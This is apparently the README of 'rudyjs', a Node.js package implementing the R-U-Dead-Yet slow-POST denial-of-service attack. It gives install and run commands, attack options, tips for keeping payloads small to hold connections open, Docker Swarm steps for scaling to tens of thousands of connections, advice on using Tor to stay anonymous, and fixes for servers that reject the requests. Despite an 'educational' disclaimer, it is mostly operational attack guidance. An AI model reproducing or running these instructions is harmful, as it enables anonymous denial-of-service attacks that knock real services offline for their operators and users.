# rudyjs ( R-U-DEAD-YET ? )
## RUDY DDOS Attack Implementation on Node.js


[![NPM](https://nodei.co/npm/rudyjs.png?downloads=true&downloadRank=true&stars=true)](https://nodei.co/npm/rudyjs/)


[![Build Status](https://travis-ci.org/sahilchaddha/rudyjs.svg?branch=master)](https://travis-ci.org/sahilchaddha/rudyjs)
[![Build Status](https://semaphoreci.com/api/v1/projects/be75e13b-9b1c-43eb-8350-1a652fe84f03/1950351/badge.svg)](https://semaphoreci.com/sahilchaddha-96/rudy)
[![CircleCI](https://circleci.com/gh/sahilchaddha/rudyjs/tree/master.svg?style=svg)](https://circleci.com/gh/sahilchaddha/rudyjs/tree/master)
[![CodeFactor](https://www.codefactor.io/repository/github/sahilchaddha/rudyjs/badge)](https://www.codefactor.io/repository/github/sahilchaddha/rudyjs)
[![npm](https://img.shields.io/npm/v/rudyjs.svg)](https://www.npmjs.com/package/rudyjs)
[![GitHub release](https://img.shields.io/github/release/sahilchaddha/rudyjs.svg)](https://github.com/sahilchaddha/rudyjs)
[![npm](https://img.shields.io/npm/dm/rudyjs.svg)](https://www.npmjs.com/package/rudyjs)


### Powerful Lightweight RUDY DDOS Attack using Tor Proxy

What is RUDY Attack ?

new-relic fails

**NOTE**: For Educational/Penetration Testing Purposes Only (Mitigating RUDY DDos Attacks)

## Installation :

```
 $ npm install -g rudyjs
```

### Usage :

```
 $ rudy
```

### Sample Usage :

```
 $ rudy -t "http://localhost:3000" -d 5 -n 500 --useTor --torUrl "127.0.0.1" --torPort 9051 -m "GET"
```

The above command runs RUDY DDos Attack on `http://localhost:3000` with 5 seconds delay & 500 requests

### Options :

| Command            | Type | Default | Description                                           |
|--------------------|------|---------|-------------------------------------------------------|
| -t, --target  (string)| Required | http://localhost:8080 | Target URL to attack                      |
| -l, --length  (number)| Optional | 1048576 Bytes (1 Mb) | Size of Payload (Bytes)           |
| -n, --numberOfConnections  (number)           | Optional | 500 | Number of Max Connections|
| -m, --method  (string)       | Optional | POST | HTTP Request Method|
| -d, --delay  (number)       | Optional | 5 seconds | Delay between each Bytes sent (seconds)|
| -v, --verbose       | Optional | false | Enable Verbose logs|
| -p, --useTor       | Optional | false | Use Tor Proxy|
| -u, --torUrl  (string)      | Optional | 127.0.0.1 | Custom Tor Server URL|
| -o, --torPort  (number)       | Optional | 9050 | Custom Tor Port|


### Generate Payload : 

```
 $ rudy generatePayload <charCount>
```

Usage : 

```
 $ rudy generatePayload 2
```

`generatePayload` will generate dummy payload of specific character count.Keep character count as low as possible for rudy to be effective. Smaller the payload size will keep the HTTP Socket Connection longer. The Server assumes the client has slow internet connection and will ke the thread blocked.

### Docker : Automating Multiple Attacks

Typically a single attack can run upto 2000-5000 simultaneous requests (Depending upon amount of RAM the machine has). You can also run 15000-25000 simultaneous requests using docker.

You can create docker image from supplied Dockerfile and run the container image multiple times or can use docker swarm.

You can edit the Dockerfile to update your attack configuration.

Creating Docker Image : 

```
 $ docker build -t sahilchaddha/rudy .
```

Running Docker Image : 

```
 $ docker run -d sahilchaddha/rudy
```

Reading Docker Logs :

```
 # Get container ID
 $ docker ps

 # Print app output
 $ docker logs <container id>

 # Example
    > node dist/cli.js "-t" "http://localhost:3000/" "-v" "-d" "5" "-n" "1"

    ____       _   _       ____  _____    _    ____     __   _______ _____   ___
    |  _ \     | | | |     |  _ \| ____|  / \  |  _ \    \ \ / / ____|_   _| |__ \
    | |_) |____| | | |_____| | | |  _|   / _ \ | | | |____\ V /|  _|   | |     / /
    |  _ <_____| |_| |_____| |_| | |___ / ___ \| |_| |_____| | | |___  | |    |_|
    |_| \_\     \___/      |____/|_____/_/   \_\____/      |_| |_____| |_|    (_)

    Author : Sahil Chaddha
    Website: http://www.sahilchaddha.com
    Github : https://www.github.com/sahilchaddha
    Thu May 10 2018 14:58:02 GMT+0800 (+08) *** VERBOSE ::: Logger ::: Logger set to Verbose ***
    Thu May 10 2018 14:58:02 GMT+0800 (+08) *** INFO ::: Rudy_Service ::: Attack Started at http://localhost:3000/ With Workers : 1 ***
```

Docker Swarm : Automating Monitoring of multiple Docker images : 

```
 $ docker build -t sahilchaddha/rudy .  //[Only do this if you made changes to the Dockerfile]
 $ docker service create --name <serviceName> --detach=false sahilchaddha/rudy
 $ docker service ls   //[Can see 1/1 copy running]
 $ docker service scale <serviceName>=10 // 10 instances will be created of rudy
 $ docker service ls   //[Doing this multiple times you can see the # of copies increasing]
 $ docker service rm <serviceName> // To remove service
```

This will result in creating 10 instances of rudy attack running with 2000 connections will result in 20,000 connections. This can also lead to consuming lot of memory.

### Staying Anonumous : 

Use `-p, --useTor` to make requests using tor node.
IP Address will be anonymous (tor exit node)

Its preferable to use tor or ssh tunnel

### Troubleshooting : 

#### 413 Payload too large : 

This Error occurs when HTTP server denies requests with heavy payload. Reduce `packet_len` property to 1MB or lower.

#### 405 Not Allowed : 

This HTTP Error represents that HTTP METHOD ("GET"/"POST") is not allowed on the target URL. Try changing URL to another endpoint or change HTTP METHOD.

### Author : 

Sahil Chaddha